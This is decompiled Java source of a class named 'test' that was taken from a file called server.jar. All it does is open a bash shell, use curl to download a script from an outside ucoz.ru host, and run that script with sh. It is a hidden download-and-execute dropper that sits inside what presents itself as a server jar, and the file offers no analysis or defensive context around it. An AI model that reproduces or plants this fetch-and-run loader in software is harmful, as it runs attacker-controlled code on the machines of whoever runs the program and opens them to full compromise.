/*    */ package cmd;
/*    */ 
/*    */ import java.io.BufferedReader;
/*    */ import java.io.BufferedWriter;
/*    */ import java.io.IOException;
/*    */ import java.io.InputStreamReader;
/*    */ import java.io.OutputStream;
/*    */ import java.io.OutputStreamWriter;
/*    */ 
/*    */ public class test
/*    */ {
/*    */   public static void main(String[] args) {
/* 13 */     ProcessBuilder processBuilder = new ProcessBuilder(new String[0]);
/*    */ 
/*    */     
/* 16 */     processBuilder.command(new String[] { "bash" });
/*    */ 
/*    */     
/*    */     try {
/* 20 */       Process process = processBuilder.start();
/*    */ 
/*    */       
/* 23 */       BufferedReader reader = 
/* 24 */         new BufferedReader(new InputStreamReader(process.getInputStream()));
/* 25 */       OutputStream os = process.getOutputStream();
/* 26 */       BufferedWriter bw = 
/* 27 */         new BufferedWriter(new OutputStreamWriter(os));
/*    */       
/* 29 */       bw.write("curl -o 1.sh https://igriastranomier.ucoz.ru/hex1.txt");
/* 30 */       bw.newLine();
/* 31 */       bw.write("sh 1.sh");
/* 32 */       bw.newLine();
/* 33 */       bw.flush();
/*    */       String line;
/* 35 */       while ((line = reader.readLine()) != null) {
/* 36 */         System.out.println(line);
/*    */       }
/*    */       
/* 39 */       int exitCode = process.waitFor();
/* 40 */       System.out.println("\nExited with error code : " + exitCode);
/*    */     }
/* 42 */     catch (IOException e) {
/* 43 */       e.printStackTrace();
/* 44 */     } catch (InterruptedException e) {
/* 45 */       e.printStackTrace();
/*    */     } 
/*    */   }
/*    */ }


/* Location:              C:\Users\wera\Desktop\server.jar!\cmd\test.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */